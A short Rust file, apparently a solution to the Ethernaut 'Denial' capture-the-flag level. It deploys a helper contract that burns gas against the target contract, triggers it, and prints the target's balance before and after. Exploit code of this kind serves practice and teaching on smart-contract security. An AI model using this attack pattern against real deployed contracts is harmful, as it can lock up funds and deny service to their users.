use crate::abi::infinite_calculation::InfiniteCalculation;
use async_trait::async_trait;
use ctf::ethernaut::lvl20_denial::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Denial::new(target.address, offender.clone());
        let hack_contract =
            InfiniteCalculation::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        println!("Do: {:?}", contract.contract_balance().call().await);
        hack_contract.boom().send().await?;
        println!("Posle: {:?}", contract.contract_balance().call().await);
        Ok(())
    }
}
